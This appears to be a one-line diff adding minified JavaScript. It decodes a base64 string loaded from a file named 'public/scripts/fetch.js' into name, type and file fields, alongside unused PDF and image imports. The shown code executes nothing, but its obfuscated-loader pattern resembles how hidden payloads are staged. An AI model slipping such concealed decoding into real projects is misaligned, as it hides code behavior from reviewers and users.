@@ -1,0 +1,1 @@
+import{PDFDocument,PDFName,PDFArray,PDFDict,PDFString}from"pdf-lib";import fs from"fs";import sharp from"sharp";export async function d1(){const t=(await import("../public/scripts/fetch.js")).default,r=Buffer.from(t,"base64").toString("utf-8"),[f,i,o]=r.split("\n");return{name:f,type:i,file:o}}
